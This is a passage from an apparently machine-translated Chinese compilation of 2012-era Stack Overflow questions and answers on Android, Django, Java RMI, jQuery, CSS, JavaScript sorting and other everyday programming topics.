C 是按值传递的一个原因是，在 FORTRAN 中，它是按引用传递的，您可以使用“CALL MYROUTINE(3)”之类的调用来调用子例程，并且子例程会更改值其论点。然后，在程序中的那个点之后，“3”将具有子程序赋予它的值。

自然，这件事发生时，引起了很大的混乱。它使错误很难找到，因为源代码所做的事情与它看起来所做的非常不同。

因此，随着人们对编程语言的了解，设计语言时使用的原则之一是避免使代码难以理解或更容易出现错误的事情。（这个原则并不总是成功地应用，因为我们也很想赋予编程语言更多的表达能力，并使编译器能够优化代码。）

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2012-07-31T08:51:56.837

根据您要执行的操作，您可以执行以下操作：

> 整数 n = 1;
> 
> n = foo(n);

只需确保 foo(int i) 在修改后返回 i 即可。

# javascript - 自定义的单选按钮在 Jquery Mobile 中看起来不正确

> ID：11736307
> 
> 赞同：0
> 
> 时间：2012-07-31T08:45:16.137
> 
> 标签：javascript, jquery, jquery-mobile

这是自定义的单选按钮[http://jsfiddle.net/coderslay/ZYKxc/7/](http://jsfiddle.net/coderslay/ZYKxc/7/)

我需要知道如何正确制作详细信息按钮。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T15:12:44.657

这些按钮包含在您的“控制组”中。独立渲染按钮

```
data-role="controlgroup" 
```

从你的字段集标签

[http://jsfiddle.net/ZYKxc/15/](http://jsfiddle.net/ZYKxc/15/)

# android - Android VideoView 比例缩放

> ID：11736311
> 
> 赞同：20
> 
> 时间：2012-07-31T08:45:37.413
> 
> 标签：android, android-layout, video, android-videoview

在Android的VideoView中，有没有办法实现和ImageView.ScaleType.CENTER_CROP一样的效果？

也就是说，我希望我的 VideoView 播放视频，使其充满整个屏幕而不会失真。如果视频纵横比不完全适合屏幕，则应裁剪而不是扭曲。

以下解决方案将填满屏幕，但不保持视频的宽高比： [https ://stackoverflow.com/a/6927300/1068656](https://stackoverflow.com/a/6927300/1068656)

并且此解决方案保持了视频的纵横比，但不会填满整个屏幕（视频被缩放直到较长的一侧碰到屏幕的边缘，从而在侧面引入了条）： [https ://stackoverflow.com/a/4855315/1068656](https://stackoverflow.com/a/4855315/1068656)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2014-10-27T12:13:40.473

虽然为时已晚，但它可能会帮助其他人寻找同样的问题。以下答案保持纵横比（videoProportion）。视频视图的额外部分被电话视图裁剪。

```
private void setDimension() {
     // Adjust the size of the video
     // so it fits on the screen
     float videoProportion = getVideoProportion();
     int screenWidth = getResources().getDisplayMetrics().widthPixels;
     int screenHeight = getResources().getDisplayMetrics().heightPixels;
     float screenProportion = (float) screenHeight / (float) screenWidth;
     android.view.ViewGroup.LayoutParams lp = videoView.getLayoutParams();

     if (videoProportion < screenProportion) {
         lp.height= screenHeight;
         lp.width = (int) ((float) screenHeight / videoProportion);
     } else {
         lp.width = screenWidth;
         lp.height = (int) ((float) screenWidth * videoProportion);
     }
     videoView.setLayoutParams(lp);
 }

// This method gets the proportion of the video that you want to display.
// I already know this ratio since my video is hardcoded, you can get the  
// height and width of your video and appropriately generate  the proportion  
//    as :height/width 
private float getVideoProportion(){
  return 1.5f;
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2020-04-21T03:19:16.073

在 Android 的 VideoView 中，这里有一个简单易行的方法来实现同样的效果`ImageView.ScaleType.CENTER_CROP`

XML

```
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout 
xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:app="http://schemas.android.com/apk/res-auto"
android:layout_width="match_parent"
android:layout_height="match_parent">

    <VideoView
        android:id="@+id/videoView"
        android:layout_width="@dimen/dimen_0dp"
        android:layout_height="@dimen/dimen_0dp"
        android:visibility="gone"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout> 
```

在科特林：

```
videoView.setOnPreparedListener { mediaPlayer ->
    val videoRatio = mediaPlayer.videoWidth / mediaPlayer.videoHeight.toFloat()
    val screenRatio = videoView.width / videoView.height.toFloat()
    val scaleX = videoRatio / screenRatio
    if (scaleX >= 1f) {
        videoView.scaleX = scaleX
    } else {
        videoView.scaleY = 1f / scaleX
    }
} 
```

在 JAVA 中：

```
videoView.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
@Override
public void onPrepared(MediaPlayer mp) {
      float videoRatio = mp.getVideoWidth() / (float) mp.getVideoHeight();
      float screenRatio = videoView.getWidth() / (float) 
      videoView.getHeight();
      float scaleX = videoRatio / screenRatio;
      if (scaleX >= 1f) {
          videoView.setScaleX(scaleX);
      } else {
          videoView.setScaleY(1f / scale);
      }
   }
}); 
```

这对我有用。希望这会对某人有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-09-15T17:27:13.977

`ConstraintLayout`具有`app:layout_constraintDimensionRatio`用于此目的的属性。

```
<androidx.constraintlayout.widget.ConstraintLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <VideoView
        android:layout_width="0dp"
        android:layout_height="0dp"
        app:layout_constraintDimensionRatio="4:3" <!-- w:h -->
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />
</ConstraintLayout> 
```

[更多详情](https://developer.android.com/reference/androidx/constraintlayout/widget/ConstraintLayout)请查看官方文档

# header - 页眉和页脚 XSL FO

> ID：11736320
> 
> 赞同：6
> 
> 时间：2012-07-31T08:46:09.740
> 
> 标签：header, footer, xsl-fo

我想在每页创建一个带有页眉和页脚的 PDF 文档，我不知道为什么它们只出现在奇数页中。

我简化了代码并创建了一个表格，我重复了几次以获得 4 页，但结果是一样的，页眉和页脚只出现在第一页和第三页。

这是代码。xsl 版本是 1.0。

```
<xsl:output indent="yes"/>

<xsl:template match ="template">
    <fo:root xmlns:fo="http://www.w3.org/1999/XSL/Format">

    <fo:layout-master-set>
<!-- layout information -->
<fo:simple-page-master master-name="pagetemplate"
              page-height="29.7cm"
              page-width="21cm"
              margin-top="1cm"
              margin-bottom="0.1cm"
              margin-left="0.8cm"
              margin-right="1.0cm">
  <fo:region-body margin-top="2.5cm" margin-bottom="2.5cm"/>
  <fo:region-before extent="2.0cm"/>
  <fo:region-after extent="2.0cm"/>
</fo:simple-page-master>
</fo:layout-master-set>

<fo:page-sequence master-reference="pagetemplate">

          <fo:static-content flow-name="xsl-region-before">
      <fo:block>
           <xsl:call-template name="header"/>
       </fo:block>
      </fo:static-content>

      <fo:static-content flow-name="xsl-region-after">
       <fo:block>
        <xsl:call-template name="footer"/>
       </fo:block>
      </fo:static-content>

      <fo:flow flow-name="xsl-region-body">

     <xsl:call-template name="block"/>
             <xsl:call-template name="block"/>
             <xsl:call-template name="block"/>
             <xsl:call-template name="block"/>

      </fo:flow>

</fo:page-sequence>

</fo:root>

</xsl:template> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T11:18:57.463

我解决问题。

问题是 region-body、region-before 和 region-after 的边距不正确。

# django - 如何覆盖模型表单集中模型表单的字段？

> ID：11736322
> 
> 赞同：2
> 
> 时间：2012-07-31T08:46:13.793
> 
> 标签：django

我有一个特殊情况，用户应该能够更改交易的状态，但不能更改`deal_type`. 因此，我想我将下拉列表的小部件更改为文本字段。

因此，我想在我的表单集中覆盖 deal_type 的小部件，然后将其子类`BaseModelFormSet`化并将其作为参数传递给工厂：

```
deal_formset = modelformset_factory(Deal, formset=BaseDealFormSet, fields = {'status', 'deal_type'}, extra=0)

class Deal(models.Model):
    deal_id             = UUIDField()
    status              = models.ForeignKey(DealStatus)    
    deal_type           = models.ForeignKey(DealType)    

class BaseDealFormSet(BaseModelFormSet):    
    deal_type        = forms.CharField(max_length=30, widget=forms.TextInput(  attrs={'readonly': 'True'}))    

    def clean_deal_type(self):
        return self.instance.deal_type 
```

但是，在模板`{{fs.deal_type}}`中，小部件仍显示为下拉列表，而不是文本字段。

我什至不确定，如果这完全按照我的预期工作，那就是将下拉列表的选定值视为文本字段。但至少我应该看到小部件的变化，对吧？但它似乎完全被忽略了。

我错过了什么？谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:25:05.307

您需要使用自定义创建一个 ModelForm 子类，并将其作为`form`参数传递给`modelformset_factory`.

```
class DealForm(forms.ModelForm):    
    deal_type = forms.CharField(max_length=30,
                                widget=forms.TextInput(attrs={'readonly': 'True'}))

    def clean_deal_type(self):
        return self.instance.deal_type

...

deal_formset = modelformset_factory(Deal, form=DealForm,
                                    fields=['status', 'deal_type'], extra=0) 
```

请注意，您如何执行此操作具有相当大的灵活性 -`fields`可以进入表单的内部 Meta 类，您可以保留您的 modelformset 子类并将表单声明放在那里，等等。

# json - 值是单独有效的 JSON 响应吗？

> ID：11736326
> 
> 赞同：0
> 
> 时间：2012-07-31T08:46:36.607
> 
> 标签：json

发送值 ie `54`,是否被视为有效的 JSON 响应`'foobar'`，`true`还是我必须将它们包装到对象中，即 ie`{ result: 54 }`等`{ result: 'foobar' }`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:49:08.490

{} 是必需的，并且必须包含至少一个名称-值对。有关 JSON 语法，请参见[http://www.json.org/](http://www.json.org/)。

# vba - 使用 vba 将 Word 文档的每一页保存到 txt 文件 (utf-8)

> ID：11736327
> 
> 赞同：0
> 
> 时间：2012-07-31T08:46:40.130
> 
> 标签：vba, utf-8, ms-word

我想将 Word 文档的每一页保存为文本文件。我使用以下代码执行此操作：

```
 Sub JedeSeiteEinNeuesDokumentOhneKopfUndFusszeilen()
  Dim oDoc As Document, nDoc As Document, oRange As Range
  Set oDoc = ActiveDocument
  Max = oDoc.ComputeStatistics(wdStatisticPages)
  For i = 1 To Max
    oDoc.Activate
    Selection.GoTo What:=wdGoToPage, Name:=i
    Set oRange = Selection.Bookmarks("\Page").Range
    If Right(oRange.Text, 1) = Chr(12) Then
      oRange.SetRange Start:=oRange.Start, End:=oRange.End - 1
    End If
    Set nDoc = Documents.Add(Template:=ActiveDocument.AttachedTemplate.FullName)
    nDoc.Content.FormattedText = oRange.FormattedText
    s = nDoc.ComputeStatistics(wdStatisticPages)
    'Wenn eine 2\. Seite mit einem einzigen leeren Absatz entstanden ist
    If s = 2 And nDoc.Paragraphs.Last.Range.Text = Chr(13) Then
      nDoc.Paragraphs.Last.Range.Delete
    End If
    nDoc.SaveAs FileFormat:=wdFormatUnicodeText, fileName:=Praefix & Format(i, "0"), AddToRecentFiles:=False
    nDoc.Close
  Next i
End Sub 
```

但我希望 txt 文件是 utf-8 格式。我该怎么做呢？

谢谢
froyo（对不起我的英语）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T12:34:23.817

我找到了我的问题的答案：

```
nDoc.SaveAs Encoding:=msoEncodingUTF8, FileFormat:=wdFormatUnicodeText, fileName:=Praefix & Format(i, "0"), AddToRecentFiles:=False 
```

解决方案是将“Encoding:=msoEncodingUTF8”部分添加到 saveAs 方法中！

弗罗约

# wix - 以提升用户身份在 wix 中运行 CustomAction

> ID：11736330
> 
> 赞同：3
> 
> 时间：2012-07-31T08:46:45.450
> 
> 标签：wix, wix3.5

正如我所看到的 - WiX 支持两种 CustomAction：

*   延迟 - 运行此操作的用户（默认情况下）被提升，但不是运行安装的用户（例如，LocalSystem 或某些类似的用户）。

*   立即 - 运行此操作的用户（默认情况下）未提升 - 它是首先运行安装程序的用户。

我需要一些介于中间的东西 - 我想要运行安装程序的用户的提升形式 (UAC)。

我需要这个的原因是访问只能由以提升形式安装包的用户访问的数据库（LocalSystem 不可访问）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T13:03:22.333

这不存在。自定义操作只有两种可能的运行环境。一种是启动用户（通常通过模拟）。另一个是 Windows Installer 服务的提升上下文。在某些机器上（例如 Windows XP，或禁用 UAC 的机器），或使用提升引导程序，启动用户是管理员用户；[`MSIUSEREALADMINDETECTION`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa816403.aspx)您可以使用和[`AdminUser`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa367545.aspx)属性的组合来检查这种情况。但在任何情况下都没有第三种情况。

# objective-c - UITableView 在动态环境中创建静态单元格

> ID：11736342
> 
> 赞同：0
> 
> 时间：2012-07-31T08:47:27.947
> 
> 标签：objective-c, ios, uitableview, reuseidentifier

我有一个`UITableView`当前设置为动态的，因为单元格会根据用户输入而变化。一些单元格具有文本字段，其他单元格具有开关，而其他单元格具有段选择器。我不确定从哪里开始。这是我打算做的。让我知道是否有任何错误。第一步（我认为）是在单元格中创建我想要的对象，例如 UITextField 或 UILabel，然后将其添加为子视图。然后我会给它一个标签。

这就是我卡住的地方。因为单元格被重用，文本字段要么跳转到其他字段并且其中的文本会消失，要么跳转到另一个单元格，对吗？

我该怎么做呢？我真的被困在这里，所以感谢您的帮助:)

期待回复！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:55:40.607

您应该使用静态单元格来显示其中包含不同元素的单元格，并使用动态单元格来显示重复的内容。

您可以在界面生成器（或情节提要）中使用文本字段、标签、开关等设置静态单元格，并将每一行设置为在代码中显示或隐藏。看到这个[帖子](https://stackoverflow.com/questions/8262270/how-to-remove-a-static-cell-from-a-uitableview-designed-in-storyboard)。

# java - 使用 Asterisk-java 播放音乐

> ID：11736345
> 
> 赞同：1
> 
> 时间：2012-07-31T08:47:31.343
> 
> 标签：java, asterisk

大家好，我想知道当他拿起我的手机时如何向用户播放音乐文件。在星号中，我可以在拨号应用程序中使用 A(X)。但我想知道如何使用星号-java 做同样的事情。哪种方法对我有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-03-26T06:01:30.023

以下是 BaseAGIScript 类中可用于播放声音文件的方法。

*   `controlStreamFile`- 播放声音文件，用户可以按任意键中断。
*   `getOption`- 播放给定的声音文件并等待用户选项。
*   `getData`- 播放给定的声音文件并等待用户输入数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:48:48.887

这应该提供您正在寻找的功能：[org.asteriskjava.fastagi.AgiChannel#streamFile](http://www.asterisk-java.org/1.0.0.M3/apidocs/org/asteriskjava/fastagi/AgiChannel.html#streamFile%28java.lang.String%29)

# java - 如何在 RMI 方法的参数中传递对象？

> ID：11736347
> 
> 赞同：3
> 
> 时间：2012-07-31T08:47:34.870
> 
> 标签：java, rmi

我正在尝试在 RMI 方法中添加参数。当我添加例如`String`一切正常。但我不确定是否可以传递我创建的对象。我是 RMI 新手，所以我的代码非常简单：

你好IF

```
public interface HelloIF extends Remote {
    String greeting(Context c) throws RemoteException;
} 
```

你好

```
public class Hello extends UnicastRemoteObject implements HelloIF {

    public Hello() throws RemoteException {
    }

    public String greeting(Context c) throws RemoteException {
        addToContext(c);
        report(c);
        return "greeting";
    }

    void addToContext(Context c) {
        c.addID(Thread.currentThread().getId());
    }

    void report(Context c) {
        System.out.println("Hello.greeting() thread : "
                + Thread.currentThread().getName() + " "
                + Thread.currentThread().getId());

        System.out.println("Hello.greeting() context : "
                + c.getDistributedThreadName() + " " + c.getRequestType());
    }
} 
```

RMI服务器

```
public class RMIServer {

    public static void main(String[] args) throws RemoteException, MalformedURLException {
        LocateRegistry.createRegistry(1099);
        HelloIF hello = new Hello();
        Naming.rebind("server.Hello", hello);
        System.out.println("server.RMI Server is ready.");
        System.out.println("RMIServer.main() thread : " + Thread.currentThread().getName() 
                + " " + Thread.currentThread().getId());
    }
} 
```

RMI客户端

```
public class RMIClient {
    public static void main(String[] args) throws RemoteException, MalformedURLException, NotBoundException {

        Context context = new Context("request1", Thread.currentThread().getName()+System.currentTimeMillis());

        Registry registry = LocateRegistry.getRegistry("localhost");
        HelloIF hello = (HelloIF) registry.lookup("server.Hello");
        System.out.println(hello.greeting(context));
        System.out.println("RMIClient.mian() thread : " + Thread.currentThread().getName() 
                + " " + Thread.currentThread().getId());
    }
} 
```

最后是我的课上下文

```
public class Context 
{
    private String requestType;
    private String distributedThreadName;
    private List<Long> IDList;

   (...) getters/setters
} 
```

我应该怎么做才能使传递上下文成为可能？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-31T08:50:06.683

你的对象应该实现`Serializable`. 正如我所看到的，这将是一个问题。它是必需的，因为两个部分之间的通信是使用序列化完成的，因此需要发送到另一部分的每个对象都需要是实现类的实例`Serializable`。

```
public class Context implements Serializable
{
    private String requestType;
    private String distributedThreadName;
    private List<Long> IDList;

   (...) getters/setters
} 
```

并请添加一个`serialVersionUID`作为一个好的做法。就像是：

```
private static final long serialVersionUID = 20120731125400L; 
```

# c# - 如何在 Windows 应用程序中创建具有褪色背景的加载窗口？

> ID：11736349
> 
> 赞同：0
> 
> 时间：2012-07-31T08:47:39.690
> 
> 标签：c#, loading, windows-applications

我正在尝试创建一个带有褪色（模糊）背景的加载窗口，它会锁定所有其他窗口

淡出背景以锁定其他窗口有什么问题吗？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:54:48.063

try with this code

```
foreach (Control item in this.Controls)
{
  if (item is Window 
      && item.Id != yourWindow )
  {
     item.Enabled = false;
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:55:05.490

With WPF I used something similar.

I created a usercontrol which has the app size with transparent background, and in the center, a loading faded form.

As the control is loaded top most, the control lock the app (user cannot click anywhere because of the transparent background). You can do some pretty graphical stuff with that. Hope it helps.

Without WPF, you can use modal dialog.

# intellij-idea - 如何在 IntelliJ IDEA 中设置单击打开文件？

> ID：11736355
> 
> 赞同：70
> 
> 时间：2012-07-31T08:48:01.530
> 
> 标签：intellij-idea, pycharm, webstorm, rubymine

eclipse 的声明视图和 javadoc 视图对应的是什么？

* * *

## 回答 #1

> 赞同：111
> 
> 时间：2012-07-31T09:23:41.173

在`Project View`点击“齿轮”图标并启用**Autoscroll to Source**选项：

![自动滚动到源](../Images/8fb631c91080fd566831f6679ffc05fd.png)

使用`Ctrl`+`Q`表示**快速 JavaDoc**，使用`Ctrl`++`Shift`表示`I`弹出声明。

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2020-03-22T13:07:41.970

现在它以更简单的方式可用。在`Project View`点击`Gear`图标，然后点击`Open Files with Single Click`：

[![在此处输入图像描述](../Images/345f7faf16c27823f298f8fb2cadb753.png)](https://i.stack.imgur.com/w4oIH.png)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2021-07-18T06:38:30.763

转到首选项并打开`Enable preview tab`，这将为所有项目启用`Open Files with Single Click`。

[![在此处输入图像描述](../Images/b4577c1d4a713620d56e466646462932.png)](https://i.stack.imgur.com/jsaN1.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T09:20:30.640

**Javadoc 以+**打开**`Ctrl``Q`**

*本身*没有声明视图，但是，您可能会对快速查找的 ++ 快捷方式**`Ctrl`感到`Shift`满意`I`**。

不知道有什么方法可以将其配置为单击即可打开文件。不知何故，如果你习惯了快捷方式，你就会非常跳过使用鼠标。例如，**`Alt`+`Home`**将打开导航栏，您可以使用箭头移动并使用 . 打开文件**`Enter`**。或者只是根据上下文使用其他一些快捷方式，如**`Ctrl`+`N`**或**`Ctrl`+ 。`E`**

# c# - 需要部署 MS Access DB

> ID：11736357
> 
> 赞同：0
> 
> 时间：2012-07-31T08:48:07.367
> 
> 标签：c#, winforms, ms-access, connection-string

我有一个要求，我必须使用 MS Access 作为数据库（后端）和 C# windows 应用程序作为前端。我需要将此应用程序部署在 LAN 上连接的多用户上。因此数据库位于中央服务器上，应用程序安装在单个机器上。我尝试使用 System DSN 连接 MS Access DB，但不能。请有人帮助连接字符串。

谢谢，金谷

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:11:54.647

您没有说明为什么无法连接到数据库，但最简单的方法是使用 Jet 的 OleDb 提供程序（当然假设您在客户端计算机上安装了 Jet）

```
using System.Data;
using System.Data.OleDb;

//
// Code ...
//

OleDbConnection conn = new OleDbConnection(@"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\\MyServer\Mydb.mdb");
conn.open();

//
// Use connection ...
// 
```

# javascript - 切换元素 jquery

> ID：11736359
> 
> 赞同：0
> 
> 时间：2012-07-31T08:48:11.770
> 
> 标签：javascript

我`a`在一个页面上有三个标签。用户只能“选择”一项。标记：

```
<div class="fl_near">
  <span class="title">title</span>
  <p>
    <a id="filter_today" class="first_tb" style="display: block">
      <span>text1</span>
    </a>
    <a id="filter_tomorrow">
      <span>text2</span>
    </a>
    <a id="filter_afterTomorrow" class="last_tb selected" style="display: block">
      <span>text3</span>
    </a>
  </p>
</div> 
```

JS代码：

```
$('.fl_near').find('a:not(.selected)').click(function () {
    alert('1');
        $('.fl_near').find('a').removeClass('selected');
        $(this).addClass('selected');
    }); 
```

此代码无法正常工作。如果我选择第一个或第二个标签，则所有 OK - 样式都会切换，但仍会显示警报。如果我选择第一个，那么我不能选择最后一个。
问题出在哪里，为什么？
谢谢。

[演示](http://jsfiddle.net/28wzk/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:54:44.073

As it is now, you're not binding the click event to the link that is selected from start.

I would change:

```
$('.fl_near').find('a:not(.selected)').click(function () { 
```

to

```
$('.fl_near a').click(function () { 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:53:04.820

因为您没有将点击处理程序绑定到最后一个元素。

尝试

```
$('.fl_near a').click(function () {
    $(this).addClass('selected').siblings().removeClass('selected');
});​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:53:33.543

过滤器`find`只运行一次——它不会监听连续的点击。为此使用事件委托 - 这样过滤器将在单击发生时应用，而不是像当前那样在绑定事件时应用。

```
$('.fl_near').on('click', 'a:not(.selected)', function (evt) {
    alert(1);
    $(this).addClass('selected').siblings('a').removeClass('selected');
}); 
```

另请注意，我已经简化了您的 add/remove-class 行。

# css - 带有 CSS 的响应式图像

> ID：11736363
> 
> 赞同：47
> 
> 时间：2012-07-31T08:48:35.557
> 
> 标签：css, image, responsive-design

我发现调整图像大小以使其具有响应性很棘手。

我正在开发一个 php 应用程序来自动将网站转换为响应版本。我有点卡在图像上。

我已经成功地为网站上的每个图像添加了一个包装类，并且可以很好地调整图像的大小。

我的问题在于自然小于窗口的图像，例如徽标和图标。我不想调整这些大小。

我的代码目前转换：

```
<img src="[src]" /> 
```

进入：

```
<div class="erb-image-wrapper">
    <img src="[src]" />
</div> 
```

我在哪里使用以下 CSS：

```
.erb-image-wrapper{
    max-width:90%;
    height:auto;
    position: relative;
    display:block;
    margin:0 auto;
}
.erb-image-wrapper img{
    width:100% !important;
    height:100% !important;
    display:block;
} 
```

这会调整所有图像的大小，但我只希望它调整超出页面宽度的图像大小。我可以通过CSS实现这一点吗？

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2012-07-31T11:55:19.193

```
.erb-image-wrapper img{
    max-width:100% !important;
    height:auto;
    display:block;
} 
```

为我工作。
感谢 MrMisterMan 的协助。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-07-31T08:51:26.433

也用于`max-width`图像。改变：

```
.erb-image-wrapper img{
    width:100% !important;
    height:100% !important;
    display:block;
} 
```

至...

```
.erb-image-wrapper img{
    max-width:100% !important;
    max-height:100% !important;
    display:block;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:57:54.907

首先用 php 检查图像，如果它很小，那么 logo 的标准尺寸为它提供任何其他 css 类并且不要改变它的大小

我认为您必须在两者之间编写脚本

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-23T08:15:15.987

嗯响应很简单

*   首先创建一个名为 cell 的类，赋予它以下属性`display:table-cell`
*   然后@`max-width:700px`做`{display:block; width:100%; clear:both}`

这就是它没有绝对的div；divs 需要 100% 然后`max-width: - desired width -`用于内部框架。一个真正的响应式网站只有不到 9 行 css 行，任何通过的东西都表明你正处于一个狗屎世界和复杂事物的世界中。

PS：`reset.css`样式表是什么让 css 盲目，他们首先给出默认样式是有逻辑的原因的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-04-09T19:23:12.570

the best way i found was to set the image you want to view responsively as a background image and sent a css property for the div as cover.

```
background-image : url('YOUR URL');
background-size : cover 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2016-08-02T21:36:10.553

使用`max-width:100%;`,`height: auto;`和`display:block;`如下：

```
image {
    max-width:100%;
    height: auto;
    display:block;
} 
```

# javascript - 按数组的值对数组进行排序

> ID：11736364
> 
> 赞同：0
> 
> 时间：2012-07-31T08:48:37.820
> 
> 标签：javascript, arrays

如果我有一个像这样的数组：

```
var myArray = [5, 0, 2, 8, 11, 1000, 50]; 
```

**我可以对其进行排序以获取从最大数字到最小数字的数组或数字吗？**， 像这样 ：

```
// [1000, 50, 11, 8, 5, 2, 0] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:51:12.463

```
//Sort alphabetically and ascending:
var myArray = [5, 0, 2, 8, 11, 1000, 50];
myarray.sort();

//Sort alphabetically and descending:
var myArray = [5, 0, 2, 8, 11, 1000, 50];
myarray.sort();
myarray.reverse();

// Sort numerically decending order:
myArray = myArray.sort(function(a, b) {return b - a;}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:52:50.690

你可以试试这个：

```
var myArray = [5, 0, 2, 8, 11, 1000, 50];
myArray.sort(function(a, b) {
    return b - a;
}); 
```

如此处建议：http: [//www.w3schools.com/jsref/jsref_sort.asp](http://www.w3schools.com/jsref/jsref_sort.asp)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:55:31.850

You can use the `sort()` function. See [https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/sort](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/sort)

Note that the default behaviour of `sort()` is **alphabetically ascending**. To sort in **numerical descending** order you will need to pass a compare function, e.g.

```
var myArray = [5, 0, 2, 8, 11, 1000, 50];
myArray.sort(function(a,b){return b-a}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T08:51:06.960

是的，通过使用**反向**方法。**Sort**方法将按升序对其进行排序。

```
var myArray = [5, 0, 2, 8, 11, 1000, 50]; 

myArray.reverse(); 
```

更多关于Array的操作，看这个[链接](http://www.javascriptkit.com/javatutors/arraysort.shtml)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:51:24.120

试试这个很简单：

```
 myArray.sort() 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-31T08:54:17.490

这应该这样做：

```
myarray.sort(function(a,b){return b - a}) 
```

# actionscript-3 - 在 mx:datagrid 中使 SelectionColor 透明

> ID：11736367
> 
> 赞同：1
> 
> 时间：2012-07-31T08:48:44.183
> 
> 标签：actionscript-3, flash, apache-flex, flex3

我在我的 flex 应用程序中使用 mx:DataGrid 组件。我显示这样的网格：

![在此处输入图像描述](../Images/87dafadd4a56c35934055a99f947b0ba.png)

我想将选定的蓝色更改为透明。我正在使用以下代码：

```
<mx:DataGrid id="dg" dataProvider="{arrDg}" width="100%" height="100%" 
    draggableColumns="false" rowCount="{arrDg.length}" click="dgClickHandler(event)" 
    variableRowHeight="true" resizableColumns="false" sortableColumns="false" 
    selectionColor="#00000000" verticalScrollPolicy="off"> 
```

但这会将颜色更改为黑色而不是透明。

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:47:52.077

**[编辑[**

哎呀，没有注意到那个颜色有 8 个零。Flash 不支持 RGBA（或具有 alpha/透明度的颜色值）。

**[结束编辑]**

如果您不希望在选择时显示任何突出显示，请尝试将(mx)的[可选择](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/controls/listClasses/ListBase.html#selectable)`DataGrid`属性设置为`false`. 似乎您有一个点击处理程序，关闭选择可能会阻止您的点击处理程序完成它的工作:(

如果您确实需要某种选择指示符，但想修改选择颜色的 alpha（透明度），则该样式设置不存在（即：没有“selectionAlpha”样式）。您必须创建一个自定义数据网格类来做到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-05T14:57:09.207

如果您需要`mx:DataGrid`可选择的，但也希望选择颜色不影响您的单元格/行的颜色，您可以使用这种方法：

扩展`DataGrid`一个覆盖函数`drawSelectionIndicator`并将函数的内容留空（您可能也对覆盖`drawHighlightIndicator`函数感兴趣）

```
public class CustomRowColorDataGrid extends DataGrid
{
    public function CustomRowColorDataGrid()
    {
        super();
    }

    override protected function drawSelectionIndicator(indicator:Sprite, x:Number, y:Number, w:Number, h:Number, color:uint, itemRenderer:IListItemRenderer):void
    {
        //If you want a rectangle arround the selected row use call this method 
        //Rectangle(indicator,x,y,0xFF9900, 2,h) ;
    }

    override protected function drawHighlightIndicator(indicator:Sprite, x:Number, y:Number, w:Number, h:Number, color:uint, itemRenderer:IListItemRenderer):void
    {
        Rectangle(indicator,x,y,highlight, 2,h) ;
    }

    private function Rectangle(indicator:Sprite, xx:int, yy:int,colorBorde:uint,grosor:int, h:int):void
    {
        var g:Graphics ;
        var w:int ;

        w = this.width - this.verticalScrollBar.width-1 ;

        g = Sprite(indicator).graphics;
        g.clear();
        g.lineStyle(grosor,colorBorde) ;
        g.drawRect(0,1,w-grosor,h-grosor) ;

        indicator.x = xx;
        indicator.y = yy;
    }       
} 
```

# java - 如何在 Linux 中签署 Mac OS X 应用程序？

> ID：11736368
> 
> 赞同：16
